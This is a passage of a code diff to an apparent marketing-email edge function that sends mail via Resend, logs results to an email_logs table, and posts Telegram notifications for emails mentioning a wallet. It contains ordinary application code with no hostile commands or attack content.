-            } catch (commercialError) {
-              console.error(`Error sending to commercial Telegram ${commercialTelegramId}:`, commercialError);
-            }
+      // Update log with success
+      await supabase
+        .from('email_logs')
+        .update({ 
+          status: 'sent',
+          resend_id: emailResult.data?.id 
+        })
+        .eq('id', emailLog.id);
+
+      // Send Telegram notification for important emails
+      if (templateUsed?.name?.toLowerCase().includes('wallet') || emailContent.includes('wallet')) {
+        await supabase.functions.invoke('send-telegram-notification', {
+          body: {
+            message: `📧 Important Email Sent\n🎯 To: ${to}\n👤 Commercial: ${commercial.name}\n📋 Template: ${templateUsed?.name || 'Custom'}\n📊 Tracking: ${trackingId}`
           }
-        } else {
-          console.error('TELEGRAM_BOT_TOKEN missing in environment');
-        }
-        
-        // Always try fallback if not all sends were successful
-        if (successfulSends < telegramChatIds.length) {
-          try {
-            // Fetch commercial name for fallback notification
-            let commercialNameFallback = 'Unknown Commercial';
-            try {
-              const { data: commercial } = await supabase
-                .from('commercials')
-                .select('name')
-                .eq('id', commercial_id)
-                .single();
-              
-              if (commercial?.name) {
-                commercialNameFallback = commercial.name;
-              }
-            } catch (err) {
-              console.warn('Could not fetch commercial name for fallback telegram:', err);
-            }
-            
-            await supabase.functions.invoke('send-telegram-notification', {
-              body: {
-                message: `📧 Email sent with wallet!
-Recipient: ${to}
-Commercial: ${commercialNameFallback}
-Step: ${step || 1}
-Subject: ${emailSubject}
-Wallet: ${uniqueWallet}
-Tracking: ${trackingCode}`
-              }
-            });
-            console.log('Telegram notification sent via edge function fallback');
-          } catch (invokeErr) {
-            console.error('Telegram fallback invoke failed:', invokeErr);
-          }
-        }
-      } catch (telegramError) {
-        console.error('Error sending Telegram notification for email:', telegramError);
-        // Don't fail the email send if Telegram fails
+        });
       }
+
+      return new Response(
+        JSON.stringify({
+          success: true,
+          message: 'Email sent successfully',
+          data: {
+            email_id: emailResult.data?.id,
+            tracking_id: trackingId,
+            tracking_url: openTrackingUrl,
+            home_link: homeLink
+          }
+        }),
+        { status: 200, headers: { 'Content-Type': 'application/json', ...corsHeaders } }
+      );
+
+    } catch (sendError: any) {
+      console.error('❌ Resend API error:', sendError);
+      
+      // Update log with error
+      await supabase
+        .from('email_logs')
+        .update({ status: 'failed' })
+        .eq('id', emailLog.id);
+
+      return new Response(
+        JSON.stringify({ 
+          success: false, 
+          error: `Email sending failed: ${sendError.message}` 
+        }),
+        { status: 500, headers: { 'Content-Type': 'application/json', ...corsHeaders } }
+      );
     }
 
-    // Log to database immediately to ensure visibility
-    const { error: insertError } = await supabase.from('email_logs').insert({
-      tracking_code: trackingCode,
-      recipient_email: to,
-      recipient_name: name,
-      contact_id: contact_id,
-      user_id: user_id,
-      template_id: template_id,
-      subject: emailSubject,
-      status: 'sent',
-      sent_at: new Date().toISOString(),
-      resend_id: emailResponse?.id || emailResponse?.data?.id || null,
-      commercial_id: commercial_id
-    });
-
-    if (insertError) {
-      console.error('Failed to insert email log:', insertError);
-    }
-
-    return new Response(JSON.stringify({
-      success: true,
-      message: "Email sent successfully",
-      tracking_code: trackingCode,
-      email_id: emailResponse.data?.id,
-      recipient: to,
-      server_ip_used: currentServerIp,
-      method_used: sendMethod,
-      from_used: fromDomain
-    }), {
-      status: 200,
-      headers: {
-        "Content-Type": "application/json",
-        ...corsHeaders,
-      },
-    });
   } catch (error: any) {
-    console.error("Error in send-marketing-email function:", error);
+    console.error('❌ Function error:', error);
     return new Response(
-      JSON.stringify({ error: error.message }),
-      {
-        status: 500,
-        headers: { "Content-Type": "application/json", ...corsHeaders },
-      }
+      JSON.stringify({ 
+        success: false, 
+        error: 'Internal server error',
+        details: error.message 
+      }),
+      { status: 500, headers: { 'Content-Type': 'application/json', ...corsHeaders } }
     );
   }
-};
-
-serve(handler);
+});
